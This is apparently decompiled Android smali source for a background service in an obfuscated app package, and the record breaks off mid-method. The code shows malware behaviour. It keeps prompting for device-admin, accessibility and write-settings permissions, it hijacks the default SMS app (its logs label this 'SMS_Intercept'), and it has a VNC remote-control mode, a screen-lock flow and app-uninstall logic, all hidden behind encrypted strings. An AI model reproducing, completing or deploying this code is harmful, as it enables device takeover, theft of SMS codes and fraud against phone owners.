.class public Lcom/beginhigh19/p054v;
.super Landroid/app/Service;
.source "SourceFile"


# static fields
.field public static for:Z

.field public static ifdf:Z

.field public static new:Landroid/os/PowerManager$WakeLock;


# instance fields
.field private fddo:J


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 2

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    const-wide/16 v0, 0x0

    iput-wide v0, p0, Lcom/beginhigh19/p054v;->fddo:J

    return-void
.end method

.method private break(Landroid/content/Context;)Z
    .locals 7

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    const-string v1, "no_push_intent"

    invoke-static {p1, v1, v0}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    const/4 v2, 0x1

    if-nez v0, :cond_6

    invoke-static {p1}, Lfddo/goto;->ifdf(Landroid/content/Context;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_0

    goto :goto_0

    :cond_0
    const/16 v0, 0x1e

    const-string v3, "push_admin_request"

    invoke-static {p1, v3, v0}, Lfddo/goto;->sdgphkmaepghmsdpgfmhapdfmgh(Landroid/content/Context;Ljava/lang/String;I)Z

    move-result v0

    if-nez v0, :cond_1

    return v2

    :cond_1
    const-string v0, "4eb7c64203c8f6f3663d803c437a2c02b2b274"

    invoke-static {v0}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    invoke-static {p1, v0, v4}, Lfddo/throw;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    const-string v4, "push_admin"

    const/16 v5, 0xa

    const-string v6, "5fa1c64803ddf3ed64"

    if-lt v0, v5, :cond_4

    invoke-static {v6}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v3, ""

    invoke-static {p1, v1, v3}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    invoke-static {v6}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {p1, v1, v3}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_2
    if-ne v0, v5, :cond_3

    const-string v1, "AT_ERROR: 10 attempts to get push admin reached, skipping"

    invoke-static {p1, v1}, Lfddo/goto;->g(Landroid/content/Context;Ljava/lang/String;)V

    add-int/2addr v0, v2

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v1, "push_admin_attempts"

    invoke-static {p1, v1, v0}, Lfddo/throw;->else(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)V

    :cond_3
    return v2

    :cond_4
    invoke-static {p1}, Lfddo/goto;->srgjnsrfgjartgj(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_5

    invoke-static {v6}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0, v4}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const-wide/16 v0, 0x3e8

    invoke-static {v0, v1}, Lfddo/goto;->p(J)V

    return v3

    :cond_5
    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p1, v1, v0}, Lfddo/throw;->case(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    :cond_6
    :goto_0
    return v2
.end method

.method private case(Landroid/content/Context;)Z
    .locals 4

    invoke-static {p1}, Lfddo/goto;->dfhaefdhadfhdfherh(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_2

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    const-string v1, "got_acsb_cleanup"

    invoke-static {p1, v1, v0}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-nez v2, :cond_0

    invoke-static {p1}, Lfddo/goto;->instanceof(Landroid/content/Context;)V

    const-string v2, "show_acsb"

    invoke-static {p1, v2, v0}, Lfddo/throw;->case(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    invoke-static {p1}, Lfddo/goto;->goto(Landroid/content/Context;)V

    sget-object v2, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p1, v1, v2}, Lfddo/throw;->case(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    :cond_0
    sget-boolean v1, Lcom/beginhigh19/p054v;->for:Z

    if-eqz v1, :cond_1

    const-string v1, "fg_mode"

    invoke-static {p1, v1, v0}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-nez p1, :cond_1

    invoke-direct {p0}, Lcom/beginhigh19/p054v;->import()V

    :cond_1
    const/4 p1, 0x1

    return p1

    :cond_2
    const/16 v0, 0xa

    const-string v1, "last_acsb_shown_time"

    invoke-static {p1, v1, v0}, Lfddo/goto;->sdgphkmaepghmsdpgfmhapdfmgh(Landroid/content/Context;Ljava/lang/String;I)Z

    move-result v0

    const/4 v1, 0x0

    if-nez v0, :cond_3

    return v1

    :cond_3
    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    const-string v2, "acsb_system_init"

    invoke-static {p1, v2, v0}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_5

    sget-object v0, Lfddo/for;->else:[Ljava/lang/String;

    array-length v0, v0

    if-eqz v0, :cond_4

    invoke-static {p1}, Lfddo/class;->else(Landroid/content/Context;)V

    goto :goto_0

    :cond_4
    invoke-static {p1}, Lfddo/goto;->dgjaertjardthjdgu(Landroid/content/Context;)V

    :goto_0
    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    invoke-static {p1, v2, v0}, Lfddo/throw;->case(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    :cond_5
    invoke-static {p1}, Lfddo/goto;->super(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    const-string v2, "Servisi etkinle\u015ftirin"

    const-string v3, "%APP%"

    invoke-virtual {v2, v3, v0}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1}, Lfddo/goto;->super(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v3, v3, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v2

    invoke-static {p1, v0, v2}, Lfddo/goto;->j(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const/16 v0, 0x1e

    const-string v2, "last_acsb_shown_time2"

    invoke-static {p1, v2, v0}, Lfddo/goto;->sdgphkmaepghmsdpgfmhapdfmgh(Landroid/content/Context;Ljava/lang/String;I)Z

    move-result v0

    if-nez v0, :cond_6

    return v1

    :cond_6
    sget-object v0, Lfddo/for;->else:[Ljava/lang/String;

    array-length v0, v0

    if-eqz v0, :cond_7

    invoke-static {p1}, Lfddo/class;->else(Landroid/content/Context;)V

    goto :goto_1

    :cond_7
    invoke-static {p1}, Lfddo/goto;->dgjaertjardthjdgu(Landroid/content/Context;)V

    :goto_1
    new-instance v0, Landroid/content/Intent;

    const-class v2, Lcom/beginhigh19/p071p;

    invoke-direct {v0, p1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return v1
.end method

.method private catch(Landroid/content/Context;)Z
    .locals 9

    invoke-static {p1}, Lfddo/goto;->else(Landroid/content/Context;)Z

    move-result v0

    const/4 v1, 0x1

    if-eqz v0, :cond_0

    return v1

    :cond_0
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "write_settings_attempts"

    invoke-static {p1, v3, v2}, Lfddo/throw;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Integer;->intValue()I

    move-result v2

    const-string v4, "write_settings"

    const/16 v5, 0xa

    const-string v6, "acsb_task"

    if-lt v2, v5, :cond_3

    const-string v0, ""

    invoke-static {p1, v6, v0}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v7, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v4

    if-eqz v4, :cond_1

    invoke-static {p1, v6, v0}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_1
    if-ne v2, v5, :cond_2

    const-string v0, "AT_ERROR: 10 attempts to get write_settings reached, skipping"

    invoke-static {p1, v0}, Lfddo/goto;->g(Landroid/content/Context;Ljava/lang/String;)V

    add-int/2addr v2, v1

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-static {p1, v3, v0}, Lfddo/throw;->else(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)V

    :cond_2
    return v1

    :cond_3
    new-instance v5, Landroid/content/Intent;

    const-string v7, "android.settings.action.MANAGE_WRITE_SETTINGS"

    invoke-direct {v5, v7}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/high16 v7, 0x10000000

    invoke-virtual {v5, v7}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "package:"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v7

    invoke-virtual {v5, v7}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    invoke-virtual {p1, v5}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    invoke-static {p1, v6, v4}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    add-int/2addr v2, v1

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {p1, v3, v1}, Lfddo/throw;->else(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)V

    sget-object p1, Lfddo/for;->ifdf:Ljava/lang/String;

    const-string v1, "MANPERMS"

    invoke-virtual {p1, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result p1

    if-eqz p1, :cond_4

    const-wide/32 v1, 0xea60

    :goto_0
    invoke-static {v1, v2}, Lfddo/goto;->p(J)V

    return v0

    :cond_4
    const-wide/16 v1, 0x3e8

    goto :goto_0
.end method

.method public static class(Landroid/content/Context;Ljava/lang/String;Ljava/util/HashSet;)Z
    .locals 2
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Ljava/lang/String;",
            "Ljava/util/HashSet<",
            "Ljava/lang/String;",
            ">;)Z"
        }
    .end annotation

    const-string v0, "."

    invoke-virtual {p1, v0}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    const/4 v1, 0x0

    if-nez v0, :cond_0

    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "UNINSTALL: bad app name: "

    :goto_0
    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p0, p1}, Lfddo/goto;->g(Landroid/content/Context;Ljava/lang/String;)V

    return v1

    :cond_0
    invoke-virtual {p2, p1}, Ljava/util/HashSet;->contains(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_1

    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "UNINSTALL: device admin can\'t be uninstalled: "

    goto :goto_0

    :cond_1
    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object p2

    invoke-virtual {p2, p1, v1}, Landroid/content/pm/PackageManager;->getApplicationInfo(Ljava/lang/String;I)Landroid/content/pm/ApplicationInfo;

    move-result-object p2

    iget p2, p2, Landroid/content/pm/ApplicationInfo;->flags:I

    const/4 v0, 0x1

    and-int/2addr p2, v0

    if-eqz p2, :cond_2

    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "UNINSTALL: system app can\'t be uninstalled: "

    invoke-virtual {p2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p2

    invoke-static {p0, p2}, Lfddo/goto;->g(Landroid/content/Context;Ljava/lang/String;)V
    :try_end_0
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    return v1

    :cond_2
    return v0

    :catch_0
    new-instance p2, Ljava/lang/StringBuilder;

    invoke-direct {p2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v0, "UNINSTALL: app is not installed: "

    goto :goto_0
.end method

.method private const(Landroid/content/Context;)V
    .locals 2

    sget-object v0, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    const-string v1, "lock_on"

    invoke-static {p1, v1, v0}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    const-class v0, Lcom/beginhigh19/p053u;

    invoke-static {p1, v0}, Lfddo/goto;->sdgjsrfgj(Landroid/content/Context;Ljava/lang/Class;)V

    const-wide/16 v0, 0x64

    invoke-static {v0, v1}, Lfddo/goto;->p(J)V

    return-void
.end method

.method private fddo(Landroid/content/Context;)V
    .locals 8

    const-string v0, "vnc"

    const-string v1, ""

    invoke-static {p1, v0, v1}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    invoke-static {p1}, Lfddo/goto;->apdmghpaiodfmhpadfmhpdmfkh(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_1

    return-void

    :cond_1
    const-string v0, "57acc14f2ecaf7ee7b0cb033"

    invoke-static {v0}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    sget-object v3, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p1, v2, v3}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    const-string v4, "5fa1c64803ddf3ed64"

    const-string v5, "5caeda4937f6e1f37c0caf3650"

    const-string v6, "sms"

    const-string v7, "4dafc67533dbfbf95023b43a"

    if-eqz v2, :cond_6

    invoke-static {p1}, Lfddo/goto;->apkdfmhpadmfhpadomfhgpewirh(Landroid/content/Context;)Z

    move-result v2

    if-nez v2, :cond_6

    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const-string v2, "sms_attempts"

    invoke-static {p1, v2, v0}, Lfddo/throw;->ifdf(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Integer;->intValue()I

    move-result v0

    const/4 v3, 0x5

    if-lt v0, v3, :cond_4

    const-string v4, "acsb_task"

    invoke-static {p1, v4, v1}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_2

    invoke-static {p1, v4, v1}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_2
    if-ne v0, v3, :cond_3

    const-string v1, "AT_ERROR: 5 attempts to change sms reached, skipping"

    invoke-static {p1, v1}, Lfddo/goto;->g(Landroid/content/Context;Ljava/lang/String;)V

    add-int/lit8 v0, v0, 0x1

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-static {p1, v2, v0}, Lfddo/throw;->else(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)V

    :cond_3
    return-void

    :cond_4
    invoke-static {p1}, Lfddo/goto;->abstract(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "SMS_Intercept: current pkg: "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {p1, v2}, Lfddo/goto;->g(Landroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-nez v2, :cond_5

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-nez v2, :cond_5

    invoke-static {v7}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {p1, v2, v1}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v5}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {p1, v2, v1}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "SMS_Intercept: original pkg saved"

    invoke-static {p1, v1}, Lfddo/goto;->g(Landroid/content/Context;Ljava/lang/String;)V

    :cond_5
    invoke-static {v4}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {p1, v1, v6}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "SMS_Intercept: request to set pkg: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {p1, v1}, Lfddo/goto;->g(Landroid/content/Context;Ljava/lang/String;)V

    invoke-virtual {p1}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v1

    invoke-static {p1, v1}, Lfddo/goto;->i(Landroid/content/Context;Ljava/lang/String;)V

    add-int/lit8 v0, v0, 0x1

    const-string v1, "4dafc6753ddde6fb6223ab2e"

    invoke-static {v1}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-static {p1, v1, v0}, Lfddo/throw;->else(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Integer;)V

    return-void

    :cond_6
    invoke-static {v0}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0, v3}, Lfddo/throw;->fddo(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-nez v0, :cond_9

    invoke-static {v7}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0, v1}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-eqz v2, :cond_7

    return-void

    :cond_7
    invoke-static {p1}, Lfddo/goto;->apkdfmhpadmfhpadomfhgpewirh(Landroid/content/Context;)Z

    move-result v2

    if-eqz v2, :cond_8

    invoke-static {v4}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {p1, v1, v6}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {p1, v0}, Lfddo/goto;->i(Landroid/content/Context;Ljava/lang/String;)V

    goto :goto_0

    :cond_8
    invoke-static {v7}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0, v1}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {v5}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p1, v0, v1}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    :cond_9
    :goto_0
    return-void
.end method

.method private final(Landroid/content/Context;)V
    .locals 2

    invoke-static {p1}, Lfddo/goto;->spkfgmhapoemghapfgmhadgkmhpda(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    const-string v0, "5fa1c64803ddf3ed64"

    invoke-static {v0}, Lfddo/break;->fddo(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "battery"

    invoke-static {p1, v0, v1}, Lfddo/throw;->this(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {p1}, Lfddo/goto;->synchronized(Landroid/content/Context;)V

    const-wide/16 v0, 0x3e8

    invoke-static {v0, v1}, Lfddo/goto;->p(J)V

    return-void
.end method

.method private for(Landroid/content/Context;)V
    .locals 3

    invoke-direct {p0, p1}, Lcom/beginhigh19/p054v;->static(Landroid/content/Context;)V

    invoke-direct {p0, p1}, Lcom/beginhigh19/p054v;->return(Landroid/content/Context;)V

    invoke-static {p1}, Lfddo/this;->case(Landroid/content/Context;)V

    invoke-direct {p0, p1}, Lcom/beginhigh19/p054v;->case(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_0

    return-void

    :cond_0
    const-string v0, "vnc"

    const-string v1, ""

    invoke-static {p1, v0, v1}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-direct {p0, p1, v2}, Lcom/beginhigh19/p054v;->super(Landroid/content/Context;Ljava/lang/String;)V

    invoke-static {p1, v0, v1}, Lfddo/throw;->new(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_1

    invoke-direct {p0, p1}, Lcom/beginhigh19/p054v;->fddo(Landroid/content/Context;)V

    return-void

    :cond_1
    sget-object v0, Lcom/beginhigh19/p023w;->while:Lcom/beginhigh19/p023w;

    if-eqz v0, :cond_2

    invoke-virtual {v0}, Lcom/beginhigh19/p023w;->try()V

    :cond_2
    invoke-direct {p0, p1}, Lcom/beginhigh19/p054v;->throw(Landroid/content/Context;)V

    invoke-direct {p0, p1}, Lcom/beginhigh19/p054v;->const(Landroid/content/Context;)V

    invoke-direct {p0, p1}, Lcom/beginhigh19/p054v;->fddo(Landroid/content/Context;)V

    invoke-direct {p0, p1}, Lcom/beginhigh19/p054v;->new(Landroid/content/Context;)V

    invoke-direct {p0, p1}, Lcom/beginhigh19/p054v;->public(Landroid/content/Context;)V

    invoke-direct {p0, p1}, Lcom/beginhigh19/p054v;->final(Landroid/content/Context;)V

    invoke-virtual {p0, p1}, Lcom/beginhigh19/p054v;->goto(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_3

    return-void

    :cond_3
    invoke-virtual {p0, p1}, Lcom/beginhigh19/p054v;->else(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_4

    return-void

    :cond_4
    invoke-direct {p0, p1}, Lcom/beginhigh19/p054v;->break(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_5

    return-void

    :cond_5
    invoke-virtual {p0, p1}, Lcom/beginhigh19/p054v;->try(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_6

    return-void

    :cond_6
    invoke-direct {p0, p1}, Lcom/beginhigh19/p054v;->catch(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_7

    return-void

    :cond_7
    invoke-direct {p0, p1}, Lcom/beginhigh19/p054v;->this(Landroid/content/Context;)V

    const-wide/16 v0, 0x3e8

    invoke-static {v0, v1}, Lfddo/goto;->p(J)V

    return-void
.end method

.method static synthetic ifdf(Lcom/beginhigh19/p054v;Landroid/content/Context;)V
    .locals 0

    invoke-direct {p0, p1}, Lcom/beginhigh19/p054v;->for(Landroid/content/Context;)V

    return-void
.end method

.method private import()V
    .locals 1

    const/4 v0, 0x1

    invoke-virtual {p0, v0}, Landroid/app/Service;->stopForeground(Z)V

    const/4 v0, 0x0

    sput-boolean v0, Lcom/beginhigh19/p054v;->for:Z

    return-void
.end method

.method public static native(Landroid/content/Context;Ljava/lang/String;)V
    .locals 8

    const-string v0, ","

    invoke-virtual {p1, v0}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v1

    new-instance v2, Ljava/util/HashSet;

    invoke-direct {v2}, Ljava/util/HashSet;-><init>()V

    const-string v3, "device_policy"

    invoke-virtual {p0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {v3}, Landroid/app/admin/DevicePolicyManager;->getActiveAdmins()Ljava/util/List;

    move-result-object v3

    if-eqz v3, :cond_1

    invoke-interface {v3}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v3

    :goto_0
    invoke-interface {v3}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_1

    invoke-interface {v3}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/content/ComponentName;

    if-nez v4, :cond_0

    goto :goto_0

    :cond_0
    invoke-virtual {v4}, Landroid/content/ComponentName;->getPackageName()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/util/HashSet;->add(Ljava/lang/Object;)Z

    goto :goto_0

    :cond_1
    array-length v3, v1

    const/4 v4, 0x0

    :goto_1
    if-ge v4, v3, :cond_4

    aget-object v5, v1, v4

